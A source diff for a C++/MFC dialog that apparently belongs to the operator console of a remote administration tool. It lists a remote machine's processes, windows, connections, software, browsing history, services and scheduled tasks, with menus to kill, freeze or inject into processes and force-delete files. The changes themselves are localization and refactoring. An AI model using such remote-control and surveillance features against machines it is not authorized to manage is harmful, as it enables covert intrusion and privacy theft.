@@ -95,13 +95,13 @@ BOOL CMachineDlg::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
         SortColumn(pHDNotify->iItem, pHDNotify->iItem == m_nSortedCol ? !m_bAscending : true);
     }
 
-    return CDialog::OnNotify(wParam, lParam, pResult);
+    return __super::OnNotify(wParam, lParam, pResult);
 }
 
 
 void CMachineDlg::DoDataExchange(CDataExchange* pDX)
 {
-    CDialog::DoDataExchange(pDX);
+    __super::DoDataExchange(pDX);
 
     DDX_Control(pDX, IDC_LIST, m_list);
     DDX_Control(pDX, IDC_TAB, m_tab);
@@ -125,14 +125,14 @@ END_MESSAGE_MAP()
 
 BOOL CMachineDlg::OnInitDialog()
 {
-    CDialog::OnInitDialog();
+    __super::OnInitDialog();
 
     SetIcon(m_hIcon, TRUE);			// Set big icon
     SetIcon(m_hIcon, FALSE);		// Set small icon
 
     // TODO: Add extra initialization here
     CString str;
-    str.Format(_T("主机管理 - %s"), m_ContextObject->PeerName.c_str());
+    str.FormatL(_T("主机管理 - %s"), m_ContextObject->PeerName.c_str());
     SetWindowText(str);
 
     m_tab.SetPadding(CSize(6, 3));
@@ -140,15 +140,15 @@ BOOL CMachineDlg::OnInitDialog()
     m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES | LVS_EX_INFOTIP);
 
     int i = 0;
-    m_tab.InsertItem(i++, _T("进程管理"));
-    m_tab.InsertItem(i++, _T("窗口管理"));
-    m_tab.InsertItem(i++, _T("网络连接"));
-    m_tab.InsertItem(i++, _T("软件信息"));
-    m_tab.InsertItem(i++, _T("浏览记录"));
-    m_tab.InsertItem(i++, _T("收 藏 夹"));
-    m_tab.InsertItem(i++, _T("WIN32服务"));
-    m_tab.InsertItem(i++, _T("驱动服务"));
-    m_tab.InsertItem(i++, _T("计划任务"));
+    m_tab.InsertTabItemL(i++, "进程管理");
+    m_tab.InsertTabItemL(i++, "窗口管理");
+    m_tab.InsertTabItemL(i++, "网络连接");
+    m_tab.InsertTabItemL(i++, "软件信息");
+    m_tab.InsertTabItemL(i++, "浏览记录");
+    m_tab.InsertTabItemL(i++, "收 藏 夹");
+    m_tab.InsertTabItemL(i++, "WIN32服务");
+    m_tab.InsertTabItemL(i++, "驱动服务");
+    m_tab.InsertTabItemL(i++, "计划任务");
     m_tab.InsertItem(i++, _T("HOSTS"));
 
     if (!m_wndStatusBar.Create(this) ||
@@ -161,7 +161,7 @@ BOOL CMachineDlg::OnInitDialog()
     m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_STRETCH, 0);
     m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 300);
 
-    m_wndStatusBar.SetPaneText(0, _T("就绪"));
+    m_wndStatusBar.SetPaneTextL(0, "就绪");
     RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏
 
     HWND hWndHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
@@ -178,25 +178,25 @@ CString CMachineDlg::__MakePriority(DWORD dwPriClass)
     CString strRet;
     switch (dwPriClass) {
     case REALTIME_PRIORITY_CLASS:
-        strRet = _T("实时");
+        strRet = _L(_T("实时"));
         break;
     case HIGH_PRIORITY_CLASS:
-        strRet = _T("高");
+        strRet = _L(_T("高"));
         break;
     case ABOVE_NORMAL_PRIORITY_CLASS:
-        strRet = _T("高于标准");
+        strRet = _L(_T("高于标准"));
         break;
     case NORMAL_PRIORITY_CLASS:
-        strRet = _T("标准");
+        strRet = _L(_T("标准"));
         break;
     case BELOW_NORMAL_PRIORITY_CLASS:
-        strRet = _T("低于标准");
+        strRet = _L(_T("低于标准"));
         break;
     case IDLE_PRIORITY_CLASS:
-        strRet = _T("空闲");
+        strRet = _L(_T("空闲"));
         break;
     default:
-        strRet = _T("未知");
+        strRet = _L(_T("未知"));
         break;
     }
 
@@ -351,7 +351,7 @@ void CMachineDlg::OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult)
 void CMachineDlg::OnSelChangingTab(NMHDR* pNMHDR, LRESULT* pResult)
 {
     if (*pResult = IsReceivingData()) {
-        m_wndStatusBar.SetPaneText(0, "正在接收数据 - 请稍后...");
+        m_wndStatusBar.SetPaneText(0, _TR("正在接收数据 - 请稍后..."));
     }
 }
 
@@ -391,16 +391,16 @@ void CMachineDlg::DeleteList()
 
 void CMachineDlg::ShowProcessList()
 {
-    m_list.InsertColumn(0, _T("映像名称"), LVCFMT_LEFT, 100);
-    m_list.InsertColumn(1, _T("PID"), LVCFMT_LEFT, 50);
-    m_list.InsertColumn(2, _T("优先级"), LVCFMT_LEFT, 50);
-    m_list.InsertColumn(3, _T("线程数"), LVCFMT_LEFT, 50);
-    m_list.InsertColumn(4, _T("用户名"), LVCFMT_LEFT, 70);
-    m_list.InsertColumn(5, _T("内存"), LVCFMT_LEFT, 70);
-    m_list.InsertColumn(6, _T("文件大小"), LVCFMT_LEFT, 80);
-    m_list.InsertColumn(7, _T("程序路径"), LVCFMT_LEFT, 300);
-    m_list.InsertColumn(8, _T("窗口名称"), LVCFMT_LEFT, 100);
-    m_list.InsertColumn(9, _T("进程位数"), LVCFMT_LEFT, 80);
+    m_list.InsertColumnL(0, _T("映像名称"), LVCFMT_LEFT, 100);
+    m_list.InsertColumnL(1, _T("PID"), LVCFMT_LEFT, 50);
+    m_list.InsertColumnL(2, _T("优先级"), LVCFMT_LEFT, 50);
+    m_list.InsertColumnL(3, _T("线程数"), LVCFMT_LEFT, 50);
+    m_list.InsertColumnL(4, _T("用户名"), LVCFMT_LEFT, 70);
+    m_list.InsertColumnL(5, _T("内存"), LVCFMT_LEFT, 70);
+    m_list.InsertColumnL(6, _T("文件大小"), LVCFMT_LEFT, 80);
+    m_list.InsertColumnL(7, _T("程序路径"), LVCFMT_LEFT, 300);
+    m_list.InsertColumnL(8, _T("窗口名称"), LVCFMT_LEFT, 100);
+    m_list.InsertColumnL(9, _T("进程位数"), LVCFMT_LEFT, 80);
 
     char* lpBuffer = (char*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
@@ -422,20 +422,20 @@ void CMachineDlg::ShowProcessList()
 
         m_list.InsertItem(i, strExeFile, 0);
 
-        str.Format(_T("%5u"), *lpPID);
+        str.FormatL(_T("%5u"), *lpPID);
         m_list.SetItemText(i, 1, str);
 
         m_list.SetItemText(i, 2, __MakePriority(*lpdwPriClass));
 
-        str.Format(_T("%5u"), *lpdwThreads);
+        str.FormatL(_T("%5u"), *lpdwThreads);
         m_list.SetItemText(i, 3, str);
 
         m_list.SetItemText(i, 4, strProcessUser);
 
-        str.Format(_T("%5u K"), *lpdwWorkingSetSize);
+        str.FormatL(_T("%5u K"), *lpdwWorkingSetSize);
         m_list.SetItemText(i, 5, str);
 
-        str.Format(_T("%5u KB"), *lpdwFileSize);
+        str.FormatL(_T("%5u KB"), *lpdwFileSize);
         m_list.SetItemText(i, 6, str);
 
         m_list.SetItemText(i, 7, strProcessName);
@@ -449,7 +449,7 @@ void CMachineDlg::ShowProcessList()
                     lstrlen(strProcessName) * sizeof(char) + lstrlen(strProcessUser) * sizeof(char) + 6;
     }
 
-    str.Format(_T("程序路径 / %d"), i);
+    str.FormatL(_T("程序路径 / %d"), i);
     LVCOLUMN lvc;
     lvc.mask = LVCF_TEXT;
     lvc.pszText = str.GetBuffer(0);
@@ -462,11 +462,11 @@ void CMachineDlg::ShowProcessList()
 
 void CMachineDlg::ShowWindowsList()
 {
-    m_list.InsertColumn(0, _T("PID"), LVCFMT_LEFT, 75);
-    m_list.InsertColumn(1, _T("句柄HWND"), LVCFMT_LEFT, 75);
-    m_list.InsertColumn(2, _T("窗口名称"), LVCFMT_LEFT, 300);
-    m_list.InsertColumn(3, _T("窗口状态"), LVCFMT_LEFT, 100);
-    m_list.InsertColumn(4, _T("大小"), LVCFMT_LEFT, 100);
+    m_list.InsertColumnL(0, _T("PID"), LVCFMT_LEFT, 75);
+    m_list.InsertColumnL(1, _T("句柄HWND"), LVCFMT_LEFT, 75);
+    m_list.InsertColumnL(2, _T("窗口名称"), LVCFMT_LEFT, 300);
+    m_list.InsertColumnL(3, _T("窗口状态"), LVCFMT_LEFT, 100);
+    m_list.InsertColumnL(4, _T("大小"), LVCFMT_LEFT, 100);
 
     LPBYTE lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
@@ -476,20 +476,20 @@ void CMachineDlg::ShowWindowsList()
     for (i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         memcpy(&m_ibfo, lpBuffer + dwOffset, sizeof(WINDOWSINFO));
 
-        str.Format(_T("%5u"), m_ibfo.m_poceessid);
+        str.FormatL(_T("%5u"), m_ibfo.m_poceessid);
         m_list.InsertItem(i, str, 25);
         char t_hwnd[250];
         _stprintf_s(t_hwnd, 250, _T("%d"), m_ibfo.m_hwnd);
         m_list.SetItemText(i, 1, t_hwnd);
         m_list.SetItemText(i, 2, m_ibfo.strTitle);
-        m_list.SetItemText(i, 3, m_ibfo.canlook ? _T("显示") : _T("隐藏"));
-        str.Format(_T("%d*%d"), m_ibfo.w, m_ibfo.h);
+        m_list.SetItemText(i, 3, m_ibfo.canlook ? _L(_T("显示")) : _L(_T("隐藏")));
+        str.FormatL(_T("%d*%d"), m_ibfo.w, m_ibfo.h);
         m_list.SetItemText(i, 4, str);
         // ListItem 为进程ID
         m_list.SetItemData(i, (DWORD_PTR)new ListItem(m_list, i, m_ibfo.m_poceessid));
         dwOffset += sizeof(WINDOWSINFO);
     }
-    str.Format(_T("窗口名称 / %d"), i);
+    str.FormatL(_T("窗口名称 / %d"), i);
     LVCOLUMN lvc = {};
     lvc.mask = LVCF_TEXT;
     lvc.pszText = str.GetBuffer(0);
@@ -502,13 +502,13 @@ void CMachineDlg::ShowWindowsList()
 
 void CMachineDlg::ShowNetStateList()
 {
-    m_list.InsertColumn(0, _T("进程名"), LVCFMT_LEFT, 100);
-    m_list.InsertColumn(1, _T("PID"), LVCFMT_LEFT, 50);
-    m_list.InsertColumn(2, _T("协议"), LVCFMT_LEFT, 50);
-    m_list.InsertColumn(3, _T("本地地址:端口"), LVCFMT_LEFT, 130);
-    m_list.InsertColumn(4, _T("远程地址:端口"), LVCFMT_LEFT, 130);
-    m_list.InsertColumn(5, _T("目标IP归属地"), LVCFMT_LEFT, 140);
-    m_list.InsertColumn(6, _T("连接状态"), LVCFMT_LEFT, 80);
+    m_list.InsertColumnL(0, _T("进程名"), LVCFMT_LEFT, 100);
+    m_list.InsertColumnL(1, _T("PID"), LVCFMT_LEFT, 50);
+    m_list.InsertColumnL(2, _T("协议"), LVCFMT_LEFT, 50);
+    m_list.InsertColumnL(3, _T("本地地址:端口"), LVCFMT_LEFT, 130);
+    m_list.InsertColumnL(4, _T("远程地址:端口"), LVCFMT_LEFT, 130);
+    m_list.InsertColumnL(5, _T("目标IP归属地"), LVCFMT_LEFT, 140);
+    m_list.InsertColumnL(6, _T("连接状态"), LVCFMT_LEFT, 80);
 
     LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
@@ -523,7 +523,7 @@ void CMachineDlg::ShowNetStateList()
             } else if (j == 1) {
                 LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
                 pid = *lpPID;
-                str.Format(_T("%d"), *lpPID);
+                str.FormatL(_T("%d"), *lpPID);
                 m_list.SetItemText(i, j, str);
                 dwOffset += sizeof(DWORD) + 2;
             } else if (j == 5) {
@@ -554,11 +554,11 @@ void CMachineDlg::ShowNetStateList()
 
 void CMachineDlg::ShowSoftWareList()
 {
-    m_list.InsertColumn(0, _T("软件名称"), LVCFMT_LEFT, 150);
-    m_list.InsertColumn(1, _T("发行商"), LVCFMT_LEFT, 150);
-    m_list.InsertColumn(2, _T("版本"), LVCFMT_LEFT, 75);
-    m_list.InsertColumn(3, _T("安装时间"), LVCFMT_LEFT, 80);
-    m_list.InsertColumn(4, _T("卸载命令及参数"), LVCFMT_LEFT, 400);
+    m_list.InsertColumnL(0, _T("软件名称"), LVCFMT_LEFT, 150);
+    m_list.InsertColumnL(1, _T("发行商"), LVCFMT_LEFT, 150);
+    m_list.InsertColumnL(2, _T("版本"), LVCFMT_LEFT, 75);
+    m_list.InsertColumnL(3, _T("安装时间"), LVCFMT_LEFT, 80);
+    m_list.InsertColumnL(4, _T("卸载命令及参数"), LVCFMT_LEFT, 400);
 
     LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
@@ -579,16 +579,16 @@ void CMachineDlg::ShowSoftWareList()
 
 void CMachineDlg::ShowIEHistoryList()
 {
-    m_list.InsertColumn(0, _T("序号"), LVCFMT_LEFT, 70);
-    m_list.InsertColumn(1, _T("访问时间"), LVCFMT_LEFT, 130);
-    m_list.InsertColumn(2, _T("标题"), LVCFMT_LEFT, 150);
-    m_list.InsertColumn(3, _T("网页地址"), LVCFMT_LEFT, 400);
+    m_list.InsertColumnL(0, _T("序号"), LVCFMT_LEFT, 70);
+    m_list.InsertColumnL(1, _T("访问时间"), LVCFMT_LEFT, 130);
+    m_list.InsertColumnL(2, _T("标题"), LVCFMT_LEFT, 150);
+    m_list.InsertColumnL(3, _T("网页地址"), LVCFMT_LEFT, 400);
     LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
     CString	str;
     for (int i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         Browsinghistory* p_Browsinghistory = (Browsinghistory*)((char*)lpBuffer + dwOffset);
-        str.Format(_T("%d"), i);
+        str.FormatL(_T("%d"), i);
         m_list.InsertItem(i, str, 0);
         m_list.SetItemText(i, 1, p_Browsinghistory->strTime);
         m_list.SetItemText(i, 2, p_Browsinghistory->strTitle);
@@ -601,8 +601,8 @@ void CMachineDlg::ShowIEHistoryList()
 
 void CMachineDlg::ShowFavoritesUrlList()
 {
-    m_list.InsertColumn(0, _T("收藏名称"), LVCFMT_LEFT, 200);
-    m_list.InsertColumn(1, _T("Url"), LVCFMT_LEFT, 300);
+    m_list.InsertColumnL(0, _T("收藏名称"), LVCFMT_LEFT, 200);
+    m_list.InsertColumnL(1, _T("Url"), LVCFMT_LEFT, 300);
 
     LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
@@ -623,14 +623,14 @@ void CMachineDlg::ShowFavoritesUrlList()
 
 void CMachineDlg::ShowServiceList()
 {
-    m_list.InsertColumn(0, _T("显示名称"), LVCFMT_LEFT, 150);
-    m_list.InsertColumn(1, _T("描述"), LVCFMT_LEFT, 200);
-    m_list.InsertColumn(2, _T("状态"), LVCFMT_LEFT, 70);
-    m_list.InsertColumn(3, _T("启动类型"), LVCFMT_LEFT, 85);
-    m_list.InsertColumn(4, _T("登陆身份"), LVCFMT_LEFT, 135);
-    m_list.InsertColumn(5, _T("桌面交互"), LVCFMT_LEFT, 60);
-    m_list.InsertColumn(6, _T("服务名"), LVCFMT_LEFT, 140);
-    m_list.InsertColumn(7, _T("可执行文件路径"), LVCFMT_LEFT, 400);
+    m_list.InsertColumnL(0, _T("显示名称"), LVCFMT_LEFT, 150);
+    m_list.InsertColumnL(1, _T("描述"), LVCFMT_LEFT, 200);
+    m_list.InsertColumnL(2, _T("状态"), LVCFMT_LEFT, 70);
+    m_list.InsertColumnL(3, _T("启动类型"), LVCFMT_LEFT, 85);
+    m_list.InsertColumnL(4, _T("登陆身份"), LVCFMT_LEFT, 135);
+    m_list.InsertColumnL(5, _T("桌面交互"), LVCFMT_LEFT, 60);
+    m_list.InsertColumnL(6, _T("服务名"), LVCFMT_LEFT, 140);
+    m_list.InsertColumnL(7, _T("可执行文件路径"), LVCFMT_LEFT, 400);
 
     char* lpBuffer = (char*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
@@ -660,22 +660,22 @@ void CMachineDlg::ShowServiceList()
     }
     CString strMsgShow;
     if (i <= 0) {
-        strMsgShow.Format(_T("无权限或无数据"));
+        strMsgShow.FormatL(_T("无权限或无数据"));
     } else {
-        strMsgShow.Format(_T("共 %d 个服务"), i);
+        strMsgShow.FormatL(_T("共 %d 个服务"), i);
     }
     PostMessage(WM_SHOW_MSG, (WPARAM)new CString(strMsgShow), 0);
 }
 
 void CMachineDlg::ShowTaskList()
 {
-    m_list.InsertColumn(0, _T("序号"), LVCFMT_LEFT, 50);
-    m_list.InsertColumn(1, _T("目录"), LVCFMT_LEFT, 200);
-    m_list.InsertColumn(2, _T("任务名称"), LVCFMT_LEFT, 300);
-    m_list.InsertColumn(3, _T("程序路径"), LVCFMT_LEFT, 400);
-    m_list.InsertColumn(4, _T("状态"), LVCFMT_LEFT, 50);
-    m_list.InsertColumn(5, _T("最后执行时间"), LVCFMT_LEFT, 130);
-    m_list.InsertColumn(6, _T("下次执行时间"), LVCFMT_LEFT, 130);
+    m_list.InsertColumnL(0, _T("序号"), LVCFMT_LEFT, 50);
+    m_list.InsertColumnL(1, _T("目录"), LVCFMT_LEFT, 200);
+    m_list.InsertColumnL(2, _T("任务名称"), LVCFMT_LEFT, 300);
+    m_list.InsertColumnL(3, _T("程序路径"), LVCFMT_LEFT, 400);
+    m_list.InsertColumnL(4, _T("状态"), LVCFMT_LEFT, 50);
+    m_list.InsertColumnL(5, _T("最后执行时间"), LVCFMT_LEFT, 130);
+    m_list.InsertColumnL(6, _T("下次执行时间"), LVCFMT_LEFT, 130);
 
     BYTE* lpBuffer = (BYTE*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer() + 1);
     DATE lasttime = 0;
@@ -690,7 +690,7 @@ void CMachineDlg::ShowTaskList()
         lasttime = *((DATE*)(status + lstrlen(status) + 1));
         nexttime = *((DATE*)((CHAR*)(status + lstrlen(status) + 1) + sizeof(DATE)));
         ULONGLONG a = *((ULONGLONG*)(&lasttime));
-        str.Format(_T("%d"), i + 1);
+        str.FormatL(_T("%d"), i + 1);
         if(!m_list.GetSafeHwnd())
             continue;
         m_list.InsertItem(i, str);
@@ -718,7 +718,7 @@ void CMachineDlg::ShowTaskList()
 
 void CMachineDlg::ShowHostsList()
 {
-    m_list.InsertColumn(0, _T("数据"), LVCFMT_LEFT, 600);
+    m_list.InsertColumnL(0, _T("数据"), LVCFMT_LEFT, 600);
 
     LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     int i = 0;
@@ -738,7 +738,7 @@ void CMachineDlg::ShowHostsList()
 
 void CMachineDlg::OnSize(UINT nType, int cx, int cy)
 {
-    CDialog::OnSize(nType, cx, cy);
+    __super::OnSize(nType, cx, cy);
 
     // TODO: Add your message handler code here
     if (IsWindowVisible())
@@ -831,18 +831,18 @@ void CMachineDlg::ShowProcessList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除文件(&C)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("结束进程(&E)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("冻结进程(&D)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("解冻进程(&J)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 600, _T("强删文件(&Q)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 700, _T("注入管理(&I)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 200, _T("删除文件(&C)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 300, _T("结束进程(&E)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 400, _T("冻结进程(&D)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 500, _T("解冻进程(&J)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 600, _T("强删文件(&Q)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 700, _T("注入管理(&I)"));
 
     CPoint	p;
     GetCursorPos(&p);
@@ -870,7 +870,7 @@ void CMachineDlg::ShowProcessList_menu()
             Data += _T("\r\n");
         }
         SetClipboardText(Data);
-        MessageBox(_T("已复制数据到剪切板!"), "提示");
+        MessageBoxL(_T("已复制数据到剪切板!"), "提示", MB_ICONINFORMATION);
     }
     break;
     case 200: {
@@ -989,21 +989,21 @@ void CMachineDlg::ShowWindowsList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("还原窗口(&H)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("隐藏窗口(&Y)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("关闭窗口(&E)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("最 大 化(&M)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 600, _T("最 小 化(&I)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 700, _T("冻结进程(&D)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 800, _T("解冻进程(&J)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 900, _T("结束进程(&E)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 200, _T("还原窗口(&H)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 300, _T("隐藏窗口(&Y)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 400, _T("关闭窗口(&E)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 500, _T("最 大 化(&M)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 600, _T("最 小 化(&I)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 700, _T("冻结进程(&D)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 800, _T("解冻进程(&J)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 900, _T("结束进程(&E)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
     CPoint	p;
     GetCursorPos(&p);
     int nMenuResult = ::TrackPopupMenu(menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, 0, GetSafeHwnd(), NULL);
@@ -1030,7 +1030,7 @@ void CMachineDlg::ShowWindowsList_menu()
             Data += _T("\r\n");
         }
         SetClipboardText(Data);
-        MessageBox(_T("已复制数据到剪切板!"), "提示");
+        MessageBoxL(_T("已复制数据到剪切板!"), "提示", MB_ICONINFORMATION);
     }
     break;
     case 200: {
@@ -1040,7 +1040,7 @@ void CMachineDlg::ShowWindowsList_menu()
             ZeroMemory(lpMsgBuf, 20);
             lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
             DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
-            m_list.SetItemText(nItem, 3, _T("发送还原命令"));
+            m_list.SetItemTextL(nItem, 3, "发送还原命令");
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_RESTORE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
@@ -1055,7 +1055,7 @@ void CMachineDlg::ShowWindowsList_menu()
             ZeroMemory(lpMsgBuf, 20);
             lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
             DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
-            m_list.SetItemText(nItem, 3, _T("发送隐藏命令"));
+            m_list.SetItemTextL(nItem, 3, "发送隐藏命令");
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_HIDE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
@@ -1071,7 +1071,7 @@ void CMachineDlg::ShowWindowsList_menu()
             ZeroMemory(lpMsgBuf, 20);
             lpMsgBuf[0] = COMMAND_WINDOW_CLOSE;
             DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
-            m_list.SetItemText(nItem, 3, _T("发送关闭命令"));
+            m_list.SetItemTextL(nItem, 3, "发送关闭命令");
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));
         }
@@ -1084,7 +1084,7 @@ void CMachineDlg::ShowWindowsList_menu()
             ZeroMemory(lpMsgBuf, 20);
             lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
             DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
-            m_list.SetItemText(nItem, 3, _T("发送最大化命令"));
+            m_list.SetItemTextL(nItem, 3, "发送最大化命令");
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_MAXIMIZE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
@@ -1099,7 +1099,7 @@ void CMachineDlg::ShowWindowsList_menu()
             ZeroMemory(lpMsgBuf, 20);
             lpMsgBuf[0] = COMMAND_WINDOW_OPERATE;
             DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
-            m_list.SetItemText(nItem, 3, _T("发送最小化命令"));
+            m_list.SetItemTextL(nItem, 3, "发送最小化命令");
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_MINIMIZE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
@@ -1163,10 +1163,10 @@ void CMachineDlg::ShowNetStateList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 150, _T("结束进程(&C)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 150, _T("结束进程(&C)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
     CPoint	p;
     GetCursorPos(&p);
     int nMenuResult = ::TrackPopupMenu(menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, 0, GetSafeHwnd(), NULL);
@@ -1193,7 +1193,7 @@ void CMachineDlg::ShowNetStateList_menu()
             Data += _T("\r\n");
         }
         SetClipboardText(Data);
-        MessageBox(_T("已复制数据到剪切板!"), "提示");
+        MessageBoxL(_T("已复制数据到剪切板!"), "提示", MB_ICONINFORMATION);
     }
     break;
     case 150: {
@@ -1220,10 +1220,10 @@ void CMachineDlg::ShowSoftWareList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("卸载程序(&X)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 200, _T("卸载程序(&X)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
     CPoint	p;
     GetCursorPos(&p);
